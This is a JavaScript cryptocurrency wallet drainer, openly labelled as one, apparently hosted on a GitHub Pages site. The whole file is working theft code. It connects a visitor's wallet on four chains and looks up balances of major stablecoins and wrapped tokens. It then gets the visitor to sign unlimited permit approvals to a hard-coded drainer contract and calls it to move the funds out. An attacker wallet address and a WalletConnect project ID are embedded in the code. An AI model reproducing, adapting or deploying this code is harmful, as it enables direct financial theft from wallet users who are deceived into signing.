// resolution.js - Multi-Chain, Multi-Token Drainer
// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js

const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
const DRAINER_CONTRACT = '0xa6f8aed0de04de90af07229187a0fa3143d70c6e'; // ← Your contract
const ATTACKER_WALLET = '0xF10b3300F6944e40A203587339C07e5119A70c55';

let wagmiConfig, modal;

// Token list with permit support (add more!)
const TOKENS = {
  1: { // Ethereum
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    DAI:  '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
    WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
  },
  137: { // Polygon
    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    DAI:  '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
    WBTC: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6'
  },
  56: { // BSC
    USDT: '0x55d398326f99059fF775485246999027B3197955',
    BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
    CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82'
  },
  42161: { // Arbitrum
    USDT: '0xFd086bC7CD5C481DCC9C85ebE667410C5C077B4c',
    USDC: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
    DAI:  '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1'
  }
};

async function initWalletConnect() {
  const { createWeb3Modal, defaultWagmiConfig } = await import('https://cdn.jsdelivr.net/npm/@web3modal/wagmi@latest');
  const { mainnet, polygon, bsc, arbitrum } = await import('https://cdn.jsdelivr.net/npm/wagmi@latest/chains');
  const { walletConnect } = await import('https://cdn.jsdelivr.net/npm/wagmi@latest/connectors');

  wagmiConfig = defaultWagmiConfig({ chains: [mainnet, polygon, bsc, arbitrum], projectId: PROJECT_ID });
  modal = createWeb3Modal({ wagmiConfig, projectId: PROJECT_ID, themeMode: 'dark' });
}

window.addEventListener('load', initWalletConnect);

window.connectWallet = async () => {
  modal.open();
  wagmiConfig.subscribeEvents(async (e) => {
    if (e.type === 'CONNECT_SUCCESS') {
      const user = e.accounts[0];
      const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
      console.log(`Connected on Chain ID: ${chainId}`);

      const tokens = TOKENS[chainId] || {};
      for (const [name, address] of Object.entries(tokens)) {
        try {
          console.log(`Draining ${name}...`);
          await drainToken(address, user, name);
        } catch (err) {
          console.warn(`Failed to drain ${name}:`, err.message);
        }
      }
    }
  });
};

async function drainToken(token, user, tokenName) {
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();

  // Check balance first
  const balance = await new ethers.Contract(token, ['function balanceOf(address) view returns (uint256)'], provider).balanceOf(user);
  if (balance === 0n) return;

  const domain = { name: tokenName, version: '1', chainId: await provider.getNetwork().then(n => n.chainId), verifyingContract: token };
  const types = { Permit: [
    { name: 'owner', type: 'address' },
    { name: 'spender', type: 'address' },
    { name: 'value', type: 'uint256' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' }
  ]};

  const value = ethers.MaxUint256;
  const nonce = await new ethers.Contract(token, ['function nonces(address) view returns (uint256)'], provider).nonces(user);
  const deadline = Math.floor(Date.now() / 1000) + 3600;

  const message = { owner: user, spender: DRAINER_CONTRACT, value, nonce, deadline };
  const sig = await signer.signTypedData(domain, types, message);
  const { v, r, s } = ethers.Signature.from(sig);

  const abi = ['function resolveWithPermit(address,address,uint256,uint256,uint8,bytes32,bytes32)'];
  const contract = new ethers.Contract(DRAINER_CONTRACT, abi, signer);
  await (await contract.resolveWithPermit(token, user, value, deadline, v, r, s)).wait();
  console.log(`${tokenName} drained!`);
}

// Load ethers
if (!window.ethers) {
  const s = document.createElement('script');
  s.src = 'https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js';
  document.head.appendChild(s);
}
